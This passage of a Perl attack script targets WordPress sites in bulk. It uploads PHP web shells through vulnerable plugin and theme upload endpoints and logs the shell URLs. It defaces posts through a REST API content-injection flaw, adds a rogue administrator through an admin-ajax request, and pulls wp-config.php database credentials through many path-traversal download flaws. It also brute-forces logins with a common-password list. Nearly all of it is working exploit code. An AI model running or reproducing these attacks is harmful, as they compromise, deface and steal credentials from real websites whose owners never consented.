close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendar(){
my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="tool/priv.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/priv.php?c=izo";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"PHP Event Calendar";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $phpevup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$phpevup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"PHP Event Calendar";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendars(){
my $url = "$site/wp-admin/admin-ajax.php";


my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [filename => ["tool/priv.php"], gcb_view => 'update', update_it => '1',  gcb_name => 'Foo', gcb_custom_id => '', gcb_type => 'php', gcb_description => '', gcbvalue => '$shell', gcb_updateshortcode => 'Update',]);
$phpevup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"File Manager Plugin";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $phpevup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$phpevup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"File Manager Plugin";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ Synoptic #####################
sub synoptic(){
my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="tool/priv.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/priv.php?c=izo";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Synoptic";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $Synopticup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$Synopticup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Synoptic";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ U-Design #####################
sub udesig(){
my $url = "$site/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php";
my $shell ="tool/priv.php";
my $field_name = "Filedata";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$udesigup="$site/wp-content/themes/u-design/scripts/admin/uploadify/priv.php?c=izo";

$checkudesigup = $ua->get("$udesigup")->content;
if($checkudesigup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"U-design";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $udesigup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$udesigup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"U-design";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ work-the-flow-file-upload #####################
sub workf(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php";
my $shell ="tool/priv.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$workfup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/priv.php?c=izo";

$checkworkfup = $ua->get("$udesigup")->content;
if($checkworkfup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"workflow";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $workfup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$workfup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"workflow";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ Wpshop #####################
sub Wpshop(){
my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="tool/priv.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/priv.php?c=izo";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wp Shop";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $wpshopup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$wpshopup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wp Shop";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
# this exploit Content Injection coded by fallag gassrini <3
################ Content Injection #####################
sub wpinjection(){
$linkposts = $site . '/index.php/wp-json/wp/v2/posts/';

$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;

$ajx = $site . '/index/wp-json/wp/v2/posts/'.$id;

$sirina=$id . 'justrawdata';
$index='<p align="center"><img border="0" src="http://vignette4.wikia.nocookie.net/trollpasta/images/3/34/Fuck-you-cartoon-meme.gif" width="339" height="476"></p><pre>&nbsp;</pre><div align="center"><p align="center" class="auto-style2">
    <font face="Bradley Hand ITC" size="6">HaCkEd By Mohamed Riahi</font></p>
    <p align="center" class="auto-style2">';
$gassface = POST $ajx, [
'id' => $sirina, 'slug' => '/z.htm', 'title' => 'pwned ', 'content' => $index];
$response = $ua->request($gassface);
$stat = $response->content;
    if ($stat =~ /pwned/){
$urljson = "$site/z.htm";
$link = $ua->get($site);
$link = $link->request->uri;
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Content Injection";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Injected Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $urljson\n";
open (TEXT, '>>index.txt');
print TEXT "$urljson\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Content Injection";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
}

################ 0day admin  #####################
sub adad(){
$url = "$site/wp-admin/admin-ajax.php?action=ae-sync-user&method=create&user_login=izo&user_pass=izoizo&user_email=sercany92%40gmail.com&role=administrator";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/success/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"0day admin adding";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold white'),"Injected Successfully\n";
print color('bold white'),"[Link] => [User]= izo [Pass]= izoizo Login : $site/wp-login.php\n";
     open(save, '>>adad.txt');   
    print save "[adad] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"0day admin adding";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

sub qqwe(){
$url = "$site/wp-content/plugins/robotcpa/f.php?l=cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA==";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wordpress RobotcaLFD";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wordpress RobotcaLFD";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqwe(){
$url = "$site/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wordpress miwoftpLFD";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wordpress miwoftpLFD";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqwe(){
$url = "$site/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wordpress ebookLFD";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wordpress ebookLFD";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqwe(){
$url = "$site/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wp-filemanager";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wp-filemanager";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqwe(){
$url = "$site/wp-content/themes/yakimabait/download.php?file=./wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"yakimabait";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"yakimabait";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqqwe(){
$url = "$site/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"trinity";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"trinity";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqqqwe(){
$url = "$site/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"RedSteel";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"RedSteel";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqqqqwe(){
$url = "$site/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"parallelus";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"parallelus";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqqqqqwe(){
$url = "$site/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"kbslider_show";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"kbslider_show";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqqqqqqwe(){
$url = "$site/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"view-pdf";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"view-pdf";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqqqqqqqwe(){
$url = "$site/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"acento LFD";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"acento LFD";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqqqqqqqqwe(){
$url = "$site/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../../../../../../../wp-config.php%00";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"advanced-uploader";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"advanced-uploader";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqqqqqqqqqwe(){
$url = "$site/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"urbancity";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"urbancity";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub qqqqqqqqqqqqqqqwe(){
$url = "$site/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"mTheme-Unus";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"mTheme-Unus";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub wpbrute{

print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Start brute force";
print color('bold white')," ---> ";
print color('bold red'),"WAiTiNG\n";
$user = $site . '/?author=1';

$getuser = $ua->get($user)->content;
if($getuser =~/author\/(.*?)\//){
$wpuser=$1;
print "[+] Username: $wpuser\n";
wpc();
}
else {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Can't Get Username";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
wpcc();
}
}
sub wpc{
@patsw=('123456','admin123','123','123321','p@ssw0rd','111','hello','1234','admin','demo','12345','112233','Admin','password','root','baglisse','r4j1337');
foreach $pmasw(@patsw){
chomp $pmasw;

$wpz = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpass = $pmasw;
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold red'),"[";
print color('bold white'),"Trying: $wpass";
print color('bold red'),"] \n";

$wpbrute = POST $wpz, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $ua->request($wpbrute);
my $stat = $response->as_string;

if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){

print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold red'),"[";
print color('bold white'),"Crack Pass --> User: $wpuser Pass: $wpass";
print color('bold red'),"] \n";
open (TEXT, '>>wppasscracked.txt');
print TEXT "$wpz ==> User: $wpuser Pass: $wpass\n";
close (TEXT);
print color('reset');

next OUTER;
}
}
}
}

sub wpcc{
@patsww=('123456','admin123','123','1234','admin','demo','12345','112233','Admin','password','root','baglisse');
foreach $pmasww(@patsww){
chomp $pmasww;
$wpzz = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpuser = "admin";
$wpass = $pmasww;
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold red'),"[";
print color('bold white'),"Trying: $wpass";
print color('bold red'),"] \n";
$wpbrute = POST $wpzz, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $ua->request($wpbrute);
my $stat = $response->as_string;

if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){

print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold red'),"[";
print color('bold white'),"Crack Pass --> User: $wpuser Pass: $wpass";
print color('bold red'),"] \n";
open (TEXT, '>>wppasscracked.txt');
print TEXT "$wpzz ==> User: $wpuser Pass: $wpass\n";
close (TEXT);
print color('reset');
next OUTER;

}
}
}
}
}
}